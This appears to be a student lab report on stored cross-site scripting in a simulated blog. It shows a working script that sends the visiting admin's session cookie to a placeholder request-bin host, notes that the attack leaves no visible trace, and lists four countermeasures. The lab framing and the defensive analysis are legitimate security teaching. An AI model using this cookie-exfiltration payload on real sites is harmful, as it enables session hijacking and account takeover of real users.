# Report Lab 3 - Albin Skeppstedt Isak Söderlind

## Part 1 - XSS
We found that comments on blog posts does not have input sanitation against script tags, which made it possible to inject javascript into the frontend. The lab has a simulated admin that visits every page regularly. Meaning that when the admin loads the comment's section on a post, their client executes code that we insert.

We used this in combination with requestbin to export the cookie to another host. Leaving only the script as trace on the website after the exploit. Since it's not visably rendered, we believe that it meets the requirement about non visable traces.
### Script
```html
<script>
var request = new XMLHttpRequest();
request.open('GET', 'REQUESTBIN_URL' + '?c=' + document.cookie);
request.send();
</script>
```
### Countermeasures
Firstly, input sanitation could have prevented our attack. By escaping "<,>"-tags, they would be rendered as text instead of an executable script. This can be done server side, before the text is stored in the database.

Secondly, HTTPonly cookies would render the exploit impossible assuming that the admin is using an HTTPonly compliant web browser (Chromium, Firefox, Safari). It is a header value set on the cookie making compliant web browsers restrictive with cookies to javascript APIs. In our case, getting the session cookie with `document.cookie` wouldn't be possible.

Thridly, using an iframe for the comments div (`.secondary-navigation`) with the attribute `sandbox=allow-forms` would sandbox the comments. The sandbox attribute is deny by default, so only allowing forms would make scripts unable to run, as `allow-scripts` is a different permission that needs to be given to the iframe.

Fourthly, isolating user created content under a different origin where a seperate session key is used, or none at all. Such as having `blog.com` as a main site and `blogcontent.com` as the separate origin containing user content. In case a user uploads malicious code that steals session keys it would only get the session key for the user content part of the website (if any), not the part with the admin control.